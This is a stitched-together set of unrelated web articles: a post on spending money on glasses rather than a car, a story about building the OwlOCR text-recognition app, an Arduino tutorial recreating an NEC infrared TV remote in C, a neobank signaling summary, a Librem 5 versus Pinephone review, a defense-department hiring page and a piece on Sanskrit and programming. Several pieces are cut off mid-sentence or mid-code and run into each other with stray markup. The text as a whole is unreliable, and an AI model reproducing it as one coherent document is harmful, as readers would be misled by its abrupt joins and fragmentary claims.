<p>Plus, you’ll get to feel proud of yourself, which for some reason is extremely satisfying.</p>



<p>People often see this level of discipline as a form of self-punishment. I don’t.</p>



<p>For me, self-punishment is not living to your full potential. It’s knowing you can do better but not doing anything about it.</p>



<p>For me, discipline is a gift. It is, in fact, the best gift you can give to yourself.</p>

<p>5 years ago, I bought some new glasses. I found a cheap $60 frame and I was proud. I’ve worn those glasses every waking hour for the last 5 years, which adds up to about 30,000 hours. They’re slightly uncomfortable and I have to push them back up on my nose a few times an hour, but I make do because you can’t argue with that price!</p>



<p>Meanwhile, I recently bought a new minivan to lug the kids around. I could have made do with one for $10,000-ish less, but I wanted a nice shiny one with a DVD player and all that. I use it maybe 30 minutes a day. </p>



<p>I’m realizing lately how backwards that logic is. I saved a couple hundred bucks on glasses and <a href="https://critter.blog/2020/11/06/all-self-help-boils-down-to-choose-long-term-over-short-term/">cursed myself with 30,000 hours</a> of discomfort and annoyance. And I spent an extra $10,000 on something that I barely even use compared to those dang glasses.</p>



<p>I think it makes sense to spend our money where we spend our time. What are the things we spend the most time with? Glasses, shoes, a computer and desk and chair, a bed, a belt, whatever it is. Even if one of those things is <em>slightly</em> worse than it could be, when you multiply that by <a href="https://critter.blog/2020/11/04/what-we-have-left/">a bajillion hours of usage</a>, it explodes.</p>



<p>Say that I had spent $500 on a pair of glasses that felt great. That’s an increase of $440. Divide $440 by 30,000 hours, and it turns out that I’d be paying about 1 penny per hour for that added comfort. No brainer, right? </p>



<p>Now let’s look at the car. If I use that car for 7 years that’s about 1300 hours of driving time. That means that the extra $10,000 comes out to about $7.70 per hour. I’m paying minimum wage to no one in exchange for access to a DVD player we barely use and a van that looks a little nicer.</p>



<p>Never again. Never again will I skimp on glasses and splurge on a car. I don’t even have a commute!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><b>You know</b> the jist by now. 2020. Cringe, shrug and shudder.</p><p>2020 - the year of fabulous missed opportunities.</p><p>Death. Disease. Unemployment. Missed games and events. Disneyland closed. Weddings canceled. All bad? <b>No!</b>👇🏼</p><h2>Chase your dreams because nobody else will</h2><p>When California, and other parts of the world, started shutting things down earlier in the year, and today again, everybody had to make a choice. Here is your extra time, what are you going to do with it?</p><p>You can't do what you did before, and time is constant so you're going to spend it in some way anyway. By conscious choice or not.</p><p>The popular choice was to use it to buy toilet paper. I tried that.</p><p>Having done that and watched a lot of stuff on Netflix, I chose to put some of that extra free time towards things I’ve always wanted to do. One of those is entrepreneurship or at least building some fun side projects.</p><h2>Why you can't lose when you're building side projects</h2><p>I love working on different side projects. Let me break down what's great about them:</p><ol type="1"><li>If you're super successful, you're set for life and you've won the game. Congrats!</li><li>If not, you've anyway built something that's worth something and hey, that's a lot better than nothing!</li><li>If not, you've built something worthless, but you have probably learned something very useful in the process.</li><li>If not, let's go have a beer together and thus you've earned a friend!</li></ol><p>This article is about side projects, so you and your dependants will be fine on your primary income regardless of outcome. Any success will be a bonus, and loss won't mean you lose your home.</p><h2>How I found what to build and why you shouldn't do that</h2><p>Shame on me, but my side project's inspiration was the anti-thesis of what all the cool kids say about how to get started.</p><p>I went technology first.</p><p>Every year I watch some of the sessions from Apple's WWDC event. In 2019 their Vision API caught my eye. It was a highly optimised way to run text recognition right on the users' device and seemed to have pretty good results. The idea lingered and over the course of the next half year I increasingly started noticing when and where it could be applied to the Mac (or PC) environment.</p><p>The common denominator for the problem was this:<!-- --> <b>there’s text on the screen you want to copy, but it cannot be copied.</b></p><p>This happens more often than you realise.</p><p>Maybe the text is on slides in a video or Zoom conference, part of an image, a scanned PDF or a song name in an app like Spotify and the app developer didn’t think that field would get copied.</p><p>Solution is easy, right? Just read it and type it like a 15th century scribe.</p><p>…but that takes time, I’m a millennial, and the butterfly keyboard on my MacBook Pro is flimsy. Besides, I had learned about that nice first-party API so there was not turning back.</p><p>The other technology inspiration was SwiftUI, another cool new framework Apple released the year before that I was dying to try out.</p><p>I guess you could say that my idea was born from a personal need and reading up on tech, but if you have a choice, a personal or even better a broader need is the more important thing to consider.</p><p>That is to say, the priority should be 1) what <b>should</b> <!-- -->be done 2) what <b>could </b>be done.</p><h2>Hatching the idea into a shiny beautiful MVP</h2><p>I had everything I needed. Idea, tech, cool stuff to learn and some time to build it.</p><p>I started working on a text recognition app for the Mac with the idea that this is something I'll personally use. I'll be sure to learn a bunch of cool and useful things along the way and that will be a success in itself if nobody else cares.</p><p>It only took a couple months to put together the first version of the app.</p><p>The core functionality was that you could simply select an area on your screen and any text in that area is machine read and copied to your clipboard. From there on, you could paste to your notes or emails or whatever is appropriate in your workflow. All of this happens pretty much instantaneously, on-device, so it’s fast enough even for short text snippets and completely private for any business purpose!</p><p>I was actually really happy how well it worked and put extra emphasis on ensuring that my first users would also get a similarly great experience. The way to ensure that is through two key focus points:</p><p>1) <b>Usability</b>. UI should be aesthetically pleasing, but more importantly UX has to be functional and intuitive. I focused on building something that is easy to pick up for anyone, trying to follow good design principles and limiting features in the first version.</p><p>2) <b>Robustness</b>. It's better to have less features that work really well than a lot with bugs. This enables a<!-- --> <i><b>positive feedback loop</b></i> <!-- -->where users email you feature requests rather than angry bug reports. That keeps you motivated, your users engaged to your service and gives you healthy backlog where to add stuff.</p><h2>How it's gone so far and has it been worth it</h2><p>Of all the metrics related to apps I value customer satisfaction most.</p><p>The average rating for OwlOCR on the Mac App Store in it's first year so far stands proudly at <b>4.7 out of 5 stars</b> <!-- -->and the app has reached almost<!-- --> <b>2,000 monthly active users</b> - roughly doubling in November which was super exciting!</p><p>I take monthly active users as some measure of stickiness of the app. I mean, it could be downloaded a gazillion times, but if people don't use it, what's the point?</p><p>But there's a more important thing here beyond the numbers.</p><p>Most rewarding thing overall have been the users that have reached out to express their appreciation of the work.</p><p>In these pandemic times with on and off remote apathy, that has been a great source of inspiration and for those taps on the back I’m truly grateful to my fellow internet strangers.</p><p>Has it been worth it? Yes! When there's imposing commands and limitations on your freedom, a fun side project can give you some sense of control.</p><p><b>You can and should still pursue happiness</b>, despite the limitations.</p><p>Side projects can connect you with interesting people, pave way for entrepreneurship or side income and help with isolation depression.</p><p>Even my side project doesn't go to the moon, I've already learned new tech stacks, improved my professional skills, connected with other bootstrappers and learned a lot about miscellaneous stuff like SEO and marketing.</p><p>This year had exciting starting numbers, awesome users and a healthy growth rate, so I'm eagerly looking forward to end of the year and 2021 to see if this story can grow bigger!</p><p>And of course hoping for an end to COVID-19. Thank you frontline health workers, you are the real heroes.</p></div></div>]]>

<h2>Context :</h2>
<p>One of my earliest paychecks went into a cheap 22" TV. It's not fancy at all, but it was a nice upgrade from the old Sony Trinitron TV that was starting to show its age. The new TV has a brand name of "Vision", which is less glamorous than "Sony", but it has been working well so far, so I can't really complain. Just the other day, I found out that it is possible to get it to record something while it's on standby. It's a feature I never knew I needed until I discovered it.</p>

<p>A couple of months after I got it, I ran into a problem with the remote controller. Luckily it turned out to be caused by a dead battery. Even though it was trivial to fix, this minor incident planted the seed of fear in me. Since the TV doesn't have physical buttons, I concluded that it would become useless should the remote stop working for some reason or another. Because of this, I decided to make a backup of the remote in case something happens to it. To do so, I had to find out more about the infrared communication protocol that the TV understands.</p>

<p>Edit : I found out that the TV does have physical buttons, but they're behind the screen, which makes it horrible in terms of UX.</p>

<p>Typing "Vision TV infrared protocol" into google yielded no useful results. I figured that I might have to do some reverse engineering to find out about more the protocol. Maybe if I inspect the signal that the remote produces, I could deduce what commands to send to the TV. But that would be tedious and it would require an IR receiver coupled with some sort of logic analyzer. I did some more googling and discovered <a href="https://github.com/ukw100/IRMP">IRMP</a>, an Arduino library that does exactly what I need. In order to use it, I would need an infrared receiver so that I could feed infrared signals to the Arduino. I thought about salvaging it from an old VCR, but eventually decided to just order it online. I ended up ordering <a href="https://shoppingmaroc.net/capteurs-shields/143-capteur-infrarouge-universel-reception-tl1838-vs1838.html">the TL1838 IR sensor</a> along with a few infrared LEDs. Shopping Maroc delivered the products ASAP, which I appreciated.</p>

<p>The sensor is easy enough to use. I plugged the VCC and GND pins accordingly, then attached its OUT pin to one of the Arduino's digital inputs. After installing the library in the Arduino IDE, I uploaded the <a href="https://github.com/ukw100/IRMP/blob/master/examples/AllProtocols/AllProtocols.ino">AllProtocols</a> sketch to it. It can be found in File &gt; Examples &gt; IRMP &gt; AllProtocols. I fired up the serial monitor, reset the Arduino, and was immediately greeted with the following message :</p>

<pre>23:44:11.409 -&gt; START /tmp/arduino_modified_sketch_735654/AllProtocols.ino
23:44:11.409 -&gt; Version 1.3.1 from Nov 14 2020
23:44:11.409 -&gt; Ready to receive IR signals at pin 11
</pre>

<p>I pointed the remote towards the IR sensor and pressed the standby button. The device detected a NEC signal.</p>

<pre>23:44:17.317 -&gt; P=NEC  A=0xFE01 C=0x10
</pre>

<p>Great! I could have stopped right then and there. The IRMP library already recognizes the protocol in question, so the problem of "backing up the remote" was technically solved. However, I decided that it would be interesting to try and reproduce the protocol from scratch, especially since I had a lot of fun writing <a href="https://github.com/azihassan/SonyRemote/">a similar tool</a> for the Sony TV I mentioned earlier. This time though, I wanted to do it without relying on the Arduino software.</p>

<h2>Theory :</h2>

<p>The <a href="https://www.sbprojects.net/knowledge/ir/nec.php">SB-Projects</a> website contains documentation for many IR protocols. It came in handy it when I was working on the Sony remote clone, and I was pleasantly surprised to find out that it also explains the workings of the NEC protocol.</p>

<p>When a button is pressed, the remote sends a signal that includes an address and a command. I found that in my case, the address is set to 0xfe01. The commands change depending on what button was pressed. For example, 0 to 9 conveniently map to 0x0 to 0x9, POWER maps to 0x10, volume up maps to 0xe, etc. These values are sent LSB first. In order to send 0x19, which is 0b11001 in binary, we send the rightmost bit(1), shift to the right, send the rightmost bit again (0), shift to the right again, and repeat this process 8 times. The bits of 0x19 are therefore transmitted in this order : 1, 0, 0, 1, 1, 0, 0, 0</p>

<p>Bits are encoded like this :</p>

<ul>
  <li>ones are encoded as a 560us pulse followed by three 560us spaces</li>
  <li>zeros are encoded as a 560us pulse followed by a 560us space</li>
</ul>

<p><a href="https://1.bp.blogspot.com/-0t5VwaKq9BI/X6GyaChJwCI/AAAAAAAAAbs/2M00mlgAPAsCylcH1C-auZvWQlsVheTNACLcBGAsYHQ/s0/S%25C3%25A9lection_035.png"><img alt="" data-original-height="98" data-original-width="679" src="https://1.bp.blogspot.com/-0t5VwaKq9BI/X6GyaChJwCI/AAAAAAAAAbs/2M00mlgAPAsCylcH1C-auZvWQlsVheTNACLcBGAsYHQ/s0/S%25C3%25A9lection_035.png"></a></p>
<p>This is what the sequence "1, 0, 0, 1, 1, 0, 0, 0" looks like on GTKWave</p>

<p>If you zoom in on the pulses, you'll notice that they're not in a continuously high state. Instead, the LED rapidly switches between the ON and OFF states. It does this at a frequency of roughly 38 khz. Most infrared protocols operate at this frequency. The percentage at which the high state is activated (duty cycle) should be about 33% according to sbprojects, although I did get the TV to respond with a different duty cycle.</p>

<p><a href="https://1.bp.blogspot.com/-VNAlGh068VA/X6GzKFFrN1I/AAAAAAAAAb0/qSS7QMqLqnIugK-Udx6oPF4PrmVhqGWXwCLcBGAsYHQ/s0/S%25C3%25A9lection_036.png"><img alt="" data-original-height="60" data-original-width="188" src="https://1.bp.blogspot.com/-VNAlGh068VA/X6GzKFFrN1I/AAAAAAAAAb0/qSS7QMqLqnIugK-Udx6oPF4PrmVhqGWXwCLcBGAsYHQ/s0/S%25C3%25A9lection_036.png"></a></p>

<p>One peculiarity of the NEC protocol is that addresses and commands are sent twice. Once an address is sent, it is immediately followed by its complement. The remote basically inverts the bits of the address then sends it again. Once done, it sends the command, inverts its bits and sends it again. This serves as an error checking mechanism.</p>

<p>I found that in my case, the TV uses a modified version of the NEC protocol that has 16-bit long addresses and 8-bit commands. It took me a while to figure out that the first 16 bits are set to 0xfe01, and that the last 16 bits contain an 8-bit command followed by its complement.</p>

<p>All sessions are preceded by a start pulse of 9ms and a 4.5ms space. All sessions finish with a 560us pulse.</p>

<h2>Implementation :</h2>

<p>One of the main roadblocks I ran into consisted of the inability to tell what the code I wrote actually did. In the beginning, I only had a binary feedback. I'd write some code, upload it to the Arduino, point the infrared LED to the TV and hope for the best. It quickly became apparent that this was not optimal.</p>

<p>When I wrote a similar tool for the Sony TV, I had a Windows installation so I used <a href="https://www.labcenter.com/">Proteus</a>. It was called Proteus ISIS then, but then the terrorist organization of the same name went and gave it a bad rep.</p>

<p>I had access to Proteus because I was a student, which is no longer the case. I also switched to Linux since, and although I was able to get the demo version of Proteus to run on Wine, it was not enough. I did some googling and found out about <a href="https://github.com/buserror/simavr">simavr</a>. Thanks to this project, I was able to get an output from a specific pin of the microcontroller in the form of a VCD file. I used <a href="https://github.com/gtkwave/gtkwave">GTKWave</a> to visualize it. That's how I took the screenshots I posted in this article.</p>

<p>To get the code to work with simavr, I had the following code to main.c :</p>

<pre>#include &lt;avr/avr_mcu_section.h&gt;

AVR_MCU(F_CPU, "atmega328");

const struct avr_mmcu_vcd_trace_t _mytrace[]  _MMCU_ = {
    { AVR_MCU_VCD_SYMBOL("PB5"), .mask = (1 &lt;&lt; PB5), .what = (void*)&amp;PORTB, },
};
</pre>

<p>I also had to put <code>sleep_cpu</code> at the end of <code>main()</code> to keep simavr from running indefinitely.</p>

<p>And finally, I made sure to incorporate <code>-Wl,--undefined=_mmcu,--section-start=.mmcu=0x910000</code> in the <code>avr-gcc</code> invocation. After compiling the code, I run <code>simavr -m atmega328p -f 16000000 -t main.elf</code> to get a gtkwave-compatile VCD file in the output.</p>

<p>The Arduino I'm using has an Atmega328p chip. I plugged the LED into the D13 pin, which corresponds to the atmega's PB5 pin. To switch the state of PB5, we have to switch the state of the fifth bit of the PORTB register. To set it to 1, all we have to do is OR PORTB with 00100000, or 1 left-shifted 5 times :</p>

<pre>PORTB |= (1 &lt;&lt; PB5)
</pre>

<p>The other bits will keep their values because ORing them with 0 has no effect. To disable the PB5 bit however, we will have to AND it with 0 and AND the other bits with 1, so that their value remains intact. In other words, PORTB has to be ANDed with 11011111. This happens to be the complement of 00100000 (1 &lt;&lt; PB5) :</p>

<pre>PORTB &amp;= ~(1 &lt;&lt; PB5)
</pre>

<p>If you made it this far , congratulations, you can now consider yourself an embedded software engineer</p>

<p>Remember when I said that bytes should be sent LSB first ? It can be done with a for loop :</p>

<pre>void send_byte(int pin, uint8_t value)
{
    for(int i = 0; i &lt; 8; i++)
    {
        if(value &amp; 1)
        {
            mark(pin);
        }
        else
        {
            space(pin);
        }
        value &gt;&gt;= 1;
    }
}
</pre>

<p>What about <code>mark</code> and <code>space</code> ? According to the theory section, a binary 1 is a 560 microsecond pulse followed by a 1680 space. A zero is a 560 microsecond pulse followed by a 560 microsecond space :</p>

<pre>void mark(int pin)
{
    modulate(pin, 560);
    _delay_us(1680);
}

void space(int pin)
{
    modulate(pin, 560);
    _delay_us(560);
}
</pre>

<p>Now to the trickiest part : <code>modulate</code>. Its responsibility is to switch the PB5 pin on and off at a frequency of 38 khz for a given <code>duration</code>. Each on and off switch has to take place in 1/38000 seconds, which roughly corresponds to 26 microseconds. As such, it should perform this operation <code>duration / 26</code> times.</p>

<pre>void modulate(int pin, int microseconds)
{
    for(int i = 0; i &lt; microseconds / 26; i++)
    {
        PORTB |= (1 &lt;&lt; pin);
        _delay_us(13);
        PORTB &amp;= ~(1 &lt;&lt; pin);
        _delay_us(13);
    }
}
</pre>



<p>I kept changing the duty cycle until I got satisfying results, so I left it at 50%. These timings are not accurate because the code doesn't take into consideration the time it takes to switch the state of the PB5 pin. Despite this, it still gives acceptable results. To test this, I hardcoded a set of commands that would allow me to play a file from USB if I point the infrared at the TV and reset the Arduino. The video below demonstrates this. I apologize in advance for the abysmal quality :</p>



<p>The full code is available on <a href="https://github.com/azihassan/NEC-IR">Github</a>, but here's the relevant portion :</p>

<pre>int main(void)
{
    send_message(PB5, ADDRESS, POWER);
    _delay_ms(8000);
    send_message(PB5, ADDRESS, SOURCE);
    _delay_ms(2000);
    send_message(PB5, ADDRESS, UP);
    _delay_ms(2000);
    send_message(PB5, ADDRESS, OK);
    _delay_ms(1000);
    send_message(PB5, ADDRESS, OK);
    _delay_ms(1000);
    send_message(PB5, ADDRESS, DOWN);
    _delay_ms(1000);
    send_message(PB5, …</pre></div></div>

In this piece however, he outlines the mix between signaling and neobanks.</span></p>
<p><span>To start, Julian believes signaling explains our everyday lives, “what clothes we wear, which universities we pick and which religion we subscribe to. Everything has a hidden signaling component with which we communicate our desired tribal affiliation.”</span></p>
<ul>
<li><span>A Rolex isn’t any better at telling time than a cheaper watch. However, a Rolex signals status and wealth.</span></li>
</ul>
<p><span>Most of us know traditional banks such as Chase and Wells Fargo, however, there’s a less traditional kind of bank called a neobank:</span></p>
<ul>
<li><span>Neobanks are entirely managed via an app&nbsp;</span></li>
<li><span>Neobank card holders are the equivalent to the kids that sit at the cool-kids-table. Many of the neobanks feel more like lifestyle brands than banks or tech companies, Julian mentions.</span></li>
<li><span>Neobank premium subscriptions come with nicer looking cards: </span><a href="https://www.apple.com/apple-card/"><span>titanium</span></a><span>, </span><a href="https://www.treecard.org/"><span>wood</span></a><span>, </span><a href="https://twitter.com/cashapp/status/1290694734529400832"><span>glow-in-the-dark yellow</span></a><span>, </span><span><a href="https://n26.com/en-de/metal">N26</a>,</span><span> or </span><a href="https://www.revolut.com/en-US/revolut-metal"><span>Revolut Metal</span></a><span>.&nbsp;</span></li>
<li><span>Some neobank cards have no credit card number on the front. “[Making it easier for users to share photos of their cards on social media as an additional signaling distribution channel.” — Julian Lehr</span></li>
</ul>
<p><span>A main point in Julian’s piece is that on in-groups and out-groups. Every signaling scenario has those two possible audiences. “The in-group is the tribe you want to join and signal your affiliation to. The out-group is everyone else – people you want to distance yourself from.”</span></p>
<ul>
<li><span>Think iMessages blue text messages vs. Android’s green text messages.&nbsp;</span></li>
</ul>
<p><span>Here are two ways to increase the signaling power of an out-group:</span></p>
<ol>
<li><span>Raise prices</span></li>
<li><span>Create artificial scarcity&nbsp;</span></li>
<li><span>Have a larger out-group who is aware of the in-group and vice versa</span></li>
</ol>

								<p><b><i>My two cents</i></b><span>: Neobanks aren’t as talked about as much as people think. Maybe it’s because I’m not sitting at the cool kids table. A friend of mine got a titanium Apple credit card and would “accidentally” drop it on the table before handing it over to the waiter. Of course, it would make a significantly louder noise than my battered-plastic card. Signaling can take many forms. </span></p>

<p>On <em>2020-12-06</em> by <em>ThatGeoGuy</em></p>

<p>Huzzah! I recently received my Librem 5 (Evergreen) from
<a href="https://puri.sm/">Purism</a>. The Librem 5 is a smartphone that runs an otherwise
standard linux kernel. However, unlike Android which also relies on the linux
kernel under the hood, the Librem 5 uses a GNU userspace, adapted for mobile.
This makes it more akin to your typical laptop in some ways, although the form
factor still resembles a modern smartphone (at least, mostly). Here are some
preliminary thoughts about the phone and how it compares to
<a href="https://pine64.org/">Pine64</a>’s Pinephone, which is another phone that uses
neither Android nor iOS, and relies on a GNU / Linux based OS.</p>

<p>This is a bit of a long post, and I’m sorry for that. Brevity is certainly a
hard-earned skill, but going forward without comparing the Librem 5 to the
Pinephone seemed like the wrong choice ;)</p>



<h2 id="purism-librem-5">Purism Librem 5</h2>

<p>Purism touts the Librem 5 as a “Security and Privacy Focused Phone.” This is
not wholly untrue, and there are some features that are unique to the Librem 5
in this respect. For example, there are “kill-switches” on one side of the
phone that allow you to disable:</p>

<ul>
  <li>Mobile network and mobile data</li>
  <li>Wifi &amp; Bluetooth</li>
  <li>Camera &amp; Microphone</li>
</ul>

<p>There’s an additional feature where if you disable all three switches, then
other sensors on the phone such as GPS are all disabled as well. You’d be
better served reading through the <a href="https://puri.sm/products/librem-5">Librem 5 product
page</a> to learn more.</p>

<h2 id="pine64-pinephone">Pine64 Pinephone</h2>

<p>In contrast to the Librem 5, which touts itself as being privacy and security
focused, the <a href="https://www.pine64.org/pinephone/">Pinephone is touted as</a> “An
Open Source Smart Phone Supported by All Major Linux Phone Projects.” It is
considerably different from the Librem 5 in many ways, from the hardware all
the way to the final software. It too has kill-switches, but these are not easy
to access on the side of the phone and instead are inside the case of the
phone. You can access these kill-switches by removing the back plate.</p>

<p>One of the neat things about the Pinephone is the ability to boot and use a
variety of Linux distributions on the hardware itself. It’s as easy as loading
the distro onto an SD card, and then booting the phone. You don’t even have to
flash anything to the internal eMMC in order to run it!</p>

<h2 id="price-">Price $$$</h2>

<h3 id="librem-5">Librem 5</h3>

<p>The Librem 5 starts at $799.00 USD, or can be purchased at $1999.00 USD if you
want your Librem 5 assembled in the good ol’ US of A before they ship it to
you. There’s a lot of talk about anti-interdiction or controlling the supply
chain, but trust me in saying that you’re definitely not in the market for a
$2k phone like the Librem 5. I don’t know anyone who is.</p>

<p>I could probably write an entire post on the economics of this, but quite
frankly, it’s kind of appalling that literally anyone would pay this much. It’s
kind of appalling that Purism would charge this much. I can imagine a scheme
where the parts are shipped from China, and verified and assembled by a
part-time college student in the States and they’d likely still be able to
price it cheaper than $1999.00.</p>

<p>Anyways this post isn’t about Purism’s business practices, of which I will
comment on at some point, but regardless I will drop this matter here. Please
just don’t spend $1999.00 on a Librem 5.</p>

<p>And for that one person who will eventually claim they did purchase the
$1999.00 USA version and it was very necessary for their use case: <em>look buddy,
I get it, you’ve drank the Kool-Aid on this one but I’m sincerely doubtful that
your very specific concerns and use-case apply to even the general nerd who
gets excited about the intersection of FOSS and mobile hardware. Moreover, I’m
doubtful that even if they did apply to such a niche group that $2k is a price
point upon which you still don’t balk at and go look for literally anything
else.</em></p>

<hr>

<p>
<strong>Update (2020-12-08)</strong>:
</p>
<p>
Many wonderful people on Hacker News as well as the
Purism / Librem Matrix channels corrected me on the fact that part of the
reason that the phone is so expensive is due to the fact that the PCB is
fabricated in the States, in addition to the assembly.  I am still inclined to
believe that the price is rather exorbitant. Perhaps had the USA edition been
something that had been launched after Evergreen was completed I would be less
averse to the idea of it. Nonetheless, I still think that for the general
person reading this: you should not purchase it. You might argue that I don't
know your threat vector, but Bayes' theorem would suggest you will be better
served spending your money on a regular Librem 5 and putting the remaining
funds to something more important to you (like maybe an iPhone, so you can use
Signal while it is unavailable on the Librem 5 :-P).
</p>
<hr>

<p>I bought my Librem 5 back during the original crowdfunding campaign, so I ended
up spending a lot less than even the $799 USD. Surprisingly, I’ve been waiting
on this phone since around the end of 2017, and here we are in 2020 and I
finally have it. Purism has been sending out what are effectively <a href="https://en.wikipedia.org/wiki/Engineering_validation_test">DVT and
EVT</a> runs of the
phone that have been going through several phases named Aspen, Birch, Chestnut,
Dogwood, and finally Evergreen. Evergreen is supposed to be the final version
of the hardware, which I opted for. I wanted to get the final, true Librem 5,
not one that could be radically different. While my unit does not have FCC
certification (it is technically what you might consider a PVT unit), it is
representative of the final hardware that Purism will land on for this phone,
as there is ostensibly no more hardware revisions.</p>

<h3 id="pinephone">Pinephone</h3>

<p>The Pinephone starts at $149.99 USD, sold in small batches surrounding a
particular distro / community that is building software for the device (called
<code>&lt;distro-name&gt;</code> Community Edition). Recent batches have made a “convergence
edition” available, for $199.99 USD. The convergence editions have an extra
gigabyte of RAM and a larger eMMC flash storage, and are touted as being useful
for connecting the Pinephone to a full-size monitor and running it as if you
had a full desktop available.</p>

<p>I originally purchased a Pinephone from the UBPorts CE batch. Eventually, I
upgraded my mainboard so that my specs match that of the convergence editions
from later batches. All in all, I’ve managed to spend more than the original
$200, but I’m not disappointed, since I have had a lot of fun with the
Pinephone.</p>



<p>For the vast majority of people, the Librem 5 and Pinephone are probably not
worth even considering. The GNU userspace and associated “mobile” paradigms
within it are very much not ready for daily use.</p>

<p>For the Librem 5, there are some security aspects that this “security and
privacy focused phone” don’t even hit (e.g.  hardware backed security / secure
enclave, device encryption, etc.). That’s not to say that these can’t be made
possible in future updates, but as far as the software story today goes, they
do not yet exist.</p>

<p>
Small note: Hardware-backed features like the secure enclave do not exist on
the base phone today. However, there is a smart card reader and the M.2 slots
used for the SIM And wifi/bluetooth chipsets on board could be replaced as
well. That said, this isn't exactly in "buy an iPhone and guarantee your
physical security" territory, and there's no clear path to "do X steps to
enable this" yet.

Basically, don't be tricked by the marketing to believe this is somehow the
full package at present. It is not.
</p>

<p>Anyways, so why do I, the author, care? I will admit, after my first bout of
usage, neither phone will be a daily driver for me. I will probably continue to
stick to my Pixel 3, and it is very likely that I will eventually get another
Android device at some point in the next two years. Linux phones are definitely
not yet ready to be daily drivers; however, they are interesting for a few key
reasons.</p>

<h2 id="device-longevity">Device longevity</h2>

<p>Digital waste is a blight on our society. I can admit that the year-over-year
hardware cycle provides a vast set of improvements that can change the
smartphone landscape. However, I also acknowledge that the number of phones,
tablets, and other electronics that find their way into landfills or are
otherwise rendered into trash is a growing concern. Linux phones and mobile
hardware present an opportunity to move away from that, and it’s important to
support this in some way.</p>

<h2 id="free-software">Free software</h2>

<p>I’m a fan of free software! While my day job isn’t working on FOSS, I think
that there’s a lot of benefits to having better FOSS software available. The
least of which is because leaps in the mobile space have also attracted others
to work on Linux in the desktop space as well.</p>

<h2 id="a-third-option">A third option</h2>

<p>I care about Linux phones because they present a third option from the Android
/ iOS duopoly. Even if they suck now in (a lot of) ways, they will improve over
time. I want to move towards a future where I don’t have to choose between an
OS that’s built towards data collection and advertising, and another that’s
built on locking you into an ecosystem.</p>



<p>First, before I get into my impressions comparing the two, I should at the very
least mention what I am / am not testing. I did not / will not test:</p>

<ul>
  <li>Phone calls &amp; SMS / MMS functionality
    <ul>
      <li>I do not have a secondary mobile number, and my primary mobile number is
registered to an e-SIM on my Pixel 3. So the best I can do is test how
mobile data works on a data-only SIM.</li>
    </ul>
  </li>
  <li>Convergence features
    <ul>
      <li>I don’t really plan to use these as anything other than a mobile device, so
I haven’t bothered plugging them into a display. Additionally, my display
may be a bit too large and high-resolution for either phone to drive it
effectively.</li>
    </ul>
  </li>
  <li>Email
    <ul>
      <li>This one is still on my TODO list, however I’ve been too lazy to try
setting this up on several of the Pinephone’s possible distros.</li>
    </ul>
  </li>
  <li>Cameras
    <ul>
      <li>The Librem 5 does not yet have a functioning camera. For a phone to ship
with the hardware but no software… Well it’s not typical. So I can’t
compare anything, given that the Librem 5 hasn’t yet made it possible to do
so.</li>
    </ul>
  </li>
  <li>GPS / location
    <ul>
      <li>Look, I want to do this more than …</li></ul></li></ul></div></div></div>

<hr>
<h2 id="overview">Overview</h2>

<p>The Hirethon program connects students with propensity to serve and the technical skills the government needs to
full-time employment, internships, and scholarship opportunities within DoD. NSIN offers students the opportunity to
meet with DoD organizations who are seeking their skill sets for full-time work on some of the DoD’s most compelling
technical problems. During the Hirethon, prospective student applicants submit a resume and speak in-person with
military representatives. Participants may be interviewed at the event and, in some cases, provided a tentative job
offer. At the end of the Hirethon, participants will have access to an online hiring tool to continue pursuing additional
DoD opportunities.</p>

<hr>
<h2 id="application--next-steps">Application / Next Steps</h2>

<p><strong>Interested in participating in an NSIN Hirethon event? Complete and submit this Interest Form.</strong></p>

<p><a href="https://forms.gle/whvMjWxTAnxWFYTX7"><span>Submit Now</span></a></p>

<hr>
<h2 id="hiring-organizations">Hiring Organizations</h2>

<p>To participate in the NSIN Hirethon program, hiring organizations must be actively seeking students or recent
graduates for full-time government service positions, internships with conversion opportunities, and/or
scholarship-for-service programs. These DoD customers are required to have direct hiring authority as well as
open billets that they are looking to fill. It is expected that these customers send both recruiters and hiring
managers to the Hirethon event itself, and must be able to execute expedited hiring processes, up to and including
on-the-spot tentative offers.</p>

    <p><img height="269" width="268" data-delta="1" typeof="foaf:Image" src="https://www.utoronto.ca/sites/default/files/Libbie-Mills-IMG_1510-1-300s.jpg" alt="Libbie Mills"></p><p><strong>Libbie Mills</strong>, an assistant professor in the department for the study of religion in the University of Toronto’s&nbsp;Faculty of Arts &amp; Science, noticed something interesting this fall in her introductory Sanskrit class: computer science students.

</p>

<p>The course typically attracts students majoring in the study of religion, who are learning the language to further their research into Hinduism, Buddhism and Sikhism. Reading through her class list, however, Mills found that of six of the 40 enrolled students were actually computer science majors.&nbsp;</p>

<p>“I'm always excited when there are students from an unexpected place,” she says.&nbsp;</p>

<p>The lingual connection between Sanskrit and computer science, it turns out, has been the subject of interest for quite some time. The first well-known publication that examined the relationship was in 1985, when NASA scientist&nbsp;Rick Briggs&nbsp;published a research paper in which he argued that the 3,500-year-old language was the best candidate for programming artificial intelligence technology&nbsp;– namely because of its adherence to rigid grammatical rules.&nbsp;</p>

<p><strong>Paul Thomas</strong>, a fourth-year undergraduate student at St. Michael’s College who plans on majoring in computer science next year, says he&nbsp;has a proclivity for learning languages, but ultimately took the course because of its connection to coding.</p>

<p>“Sanskrit is a very computational language,” he explains. “It’s a lot of syntax, which is the structure of programming itself. Classical Sanskrit is an engineered language.”</p>

<p>There are nearly 4,000 rules&nbsp;recorded in the fourth&nbsp;century BCE grammar of Pāṇini, an ancient scholar of the language&nbsp;– and&nbsp;Mill’s approach to teaching it is methodical.</p>

<p>“I'm a nerd” she says. “I like mathy type things, and I teach in a bit of a sciencey way.”</p>

<p>She stresses to her students that this is not a typical language class, where after a few classes they’ll be able to casually practise what they have learned over coffee.&nbsp;</p>

<p>“It’s not conversational, there’s too much to learn at the beginning,” she says. “They must learn the characters&nbsp;and how words get put together. It’s mind-bogglingly awful at first.”&nbsp;</p>

<p>She starts with what she calls the building blocks&nbsp;–&nbsp;“the order of sounds we produce out of our mouths ... from the throat to palate to teeth to lips” –&nbsp;and enthuses over the “tidiness of the language”, where a few root words are the basis of the entire Sanskrit vocabulary.</p>

<p>“It's orderly,” Mills says. “If you know the systems for making words you can work backward&nbsp;to the root to understand the meaning of the word. It’s creative in an organized way. It is kind of amazing.”</p>

<p>Mills adds that she&nbsp;understands the affinity that computer programmers have with the language. “It’s good coding,” she says.&nbsp;</p>

